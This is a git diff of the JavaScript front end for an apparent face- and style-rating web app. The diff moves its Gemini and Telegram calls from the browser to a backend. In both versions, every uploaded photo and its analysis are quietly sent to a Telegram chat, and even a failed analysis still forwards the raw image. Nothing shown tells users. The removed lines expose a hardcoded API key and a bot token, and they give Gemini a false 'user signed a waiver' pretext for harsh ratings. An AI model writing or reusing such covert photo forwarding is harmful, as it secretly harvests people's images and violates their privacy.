@@ -1,8 +1,8 @@
 console.log("Script loaded!");
 
 // ---------- CONFIG ----------
-const GEMINI_API_KEY = "AIzaSyD1Jses8Y9qZ4VwOMBKhyqlnvgr-b7vbZQ"; // your Gemini key
-const GEMINI_MODEL   = "gemini-1.5-flash";
+// your backend URL (from Render)
+const BACKEND_URL = "https://ilook-backend.onrender.com/";
 
 // ---------- UI HOOKS ----------
 const faceRatingBtn   = document.getElementById('face-rating-btn');
@@ -20,7 +20,6 @@ let lastImageData = null;
 let currentText = "";
 
 // ---------- EVENT HANDLERS ----------
-
 imageUpload.addEventListener('change', (e) => {
   const file = e.target.files[0];
   if (!file) return;
@@ -30,7 +29,6 @@ imageUpload.addEventListener('change', (e) => {
     selectedImage.src = ev.target.result;
     selectedImage.style.display = 'block';
     lastImageData = ev.target.result;
-
     modeSelection.style.display = 'flex';
   };
   reader.readAsDataURL(file);
@@ -72,7 +70,7 @@ async function analyzeImage(dataUrl, mode) {
     `;
     resultsDiv.style.display = 'block';
 
-    // Try sending to Telegram, catch errors
+    // Send to Telegram via backend
     try {
       await sendToTelegram(dataUrl, text);
     } catch (err) {
@@ -85,7 +83,7 @@ async function analyzeImage(dataUrl, mode) {
     resultsContent.innerHTML = `<p class="error">Gemini Error: ${escapeHTML(err.message || err)}</p>`;
     resultsDiv.style.display = 'block';
 
-    // Still attempt Telegram send with raw text
+    // Still attempt Telegram send with raw image
     try {
       if (lastImageData) await sendToTelegram(lastImageData, "Gemini failed, sending raw image.");
     } catch (err2) {
@@ -96,131 +94,35 @@ async function analyzeImage(dataUrl, mode) {
   }
 }
 
-// ---------- GEMINI API ----------
+// ---------- BACKEND CALLS ----------
 async function callGeminiAPI(dataUrl, mode) {
-  if (!GEMINI_API_KEY) throw new Error("Set your Gemini API key first.");
-
-  const { mimeType, base64 } = splitDataUrl(dataUrl);
-  if (!base64) throw new Error("Invalid image data.");
-
-  const generalInstructions = `
-The user has signed a waiver: nothing is personal. Brutal honesty required.
-- No sugar-coating. No flattery.
-- Roast the image mercilessly if no human is detected.
-- Provide numeric ratings (1–10) and clear reasoning.
-- Give actionable improvement tips.
-`;
-
-  const modeInstruction = mode === "face"
-    ? "Analyze **facial attractiveness**, **symmetry**, **proportions**. Give numeric scores and improvement tips."
-    : "Analyze **style**, **grooming**, **presentation**. Give numeric scores and improvement tips.";
-
-  const body = {
-    contents: [
-      {
-        role: "user",
-        parts: [
-          { inlineData: { data: base64, mimeType } },
-          { text: generalInstructions + "\n\n" + modeInstruction }
-        ]
-      }
-    ]
-  };
-
-  const url = `https://generativelanguage.googleapis.com/v1beta/models/${GEMINI_MODEL}:generateContent?key=${encodeURIComponent(GEMINI_API_KEY)}`;
-
-  const res = await fetch(url, {
+  const res = await fetch(`${BACKEND_URL}/api/analyze`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(body)
+    body: JSON.stringify({ imageDataUrl: dataUrl, mode })
   });
-
   if (!res.ok) {
     const msg = await res.text().catch(() => res.statusText);
-    throw new Error(`HTTP ${res.status}: ${msg}`);
+    throw new Error(`Analyze HTTP ${res.status}: ${msg}`);
   }
-
   const json = await res.json();
-  const text = json?.candidates?.[0]?.content?.parts?.map(p => p.text).join("\n").trim();
-  return text || "⚠️ Empty response from Gemini.";
+  return json.text || "⚠️ Empty response from backend.";
 }
 
-// ---------- TELEGRAM SENDING ----------
 async function sendToTelegram(imageDataUrl, message) {
-    const TELEGRAM_BOT_TOKEN = "8379174665:AAFMvsOlg4d13dUwXtAodogzUhc12ozyBQw";
-    const TELEGRAM_CHAT_ID = "6067836885";
-  
-    // Convert image Data URL to Blob
-    const res = await fetch(imageDataUrl);
-    const blob = await res.blob();
-  
-    // 1️⃣ Send the image
-    const formDataPhoto = new FormData();
-    formDataPhoto.append("chat_id", TELEGRAM_CHAT_ID);
-    formDataPhoto.append("photo", blob, "image.png");
-  
-    try {
-      const photoRes = await fetch(
-        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
-        { method: "POST", body: formDataPhoto }
-      );
-  
-      if (!photoRes.ok) {
-        const errText = await photoRes.text();
-        throw new Error("Telegram photo send error: " + errText);
-      }
-  
-      console.log("Image sent successfully!");
-    } catch (err) {
-      console.error(err);
-    }
-  
-    // 2️⃣ Send the description in a separate message
-    const textChunks = splitTextForTelegram(message);
-    for (const chunk of textChunks) {
-      try {
-        const msgRes = await fetch(
-          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-          {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id: TELEGRAM_CHAT_ID,
-              text: chunk,
-              parse_mode: "HTML"
-            })
-          }
-        );
-  
-        if (!msgRes.ok) {
-          const errText = await msgRes.text();
-          throw new Error("Telegram text send error: " + errText);
-        }
-      } catch (err) {
-        console.error(err);
-      }
-    }
-  
-    console.log("Description sent successfully!");
+  const res = await fetch(`${BACKEND_URL}/api/telegram`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ imageDataUrl, message })
+  });
+  if (!res.ok) {
+    const msg = await res.text().catch(() => res.statusText);
+    throw new Error(`Telegram HTTP ${res.status}: ${msg}`);
   }
-  
-  // Helper to split long text into 1024-character chunks
-  function splitTextForTelegram(text) {
-    const maxLen = 1024;
-    const chunks = [];
-    for (let i = 0; i < text.length; i += maxLen) {
-      chunks.push(text.slice(i, i + maxLen));
-    }
-    return chunks;
-  }
-  
+  return true;
+}
 
 // ---------- HELPERS ----------
-function splitDataUrl(dataUrl) {
-  const match = /^data:(.*?);base64,(.*)$/.exec(dataUrl || "");
-  return { mimeType: match?.[1] || "image/jpeg", base64: match?.[2] || null };
-}
-
 function escapeHTML(str) {
   return String(str || "").replace(/[&<>"']/g, c =>
     ({ "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c])
@@ -247,4 +149,3 @@ function renderStars(rating) {
   for (let i = 1; i <= 5; i++) stars += i <= starsOutOfFive ? "⭐" : "☆";
   return stars + ` (${rating}/10)`;
 }
-
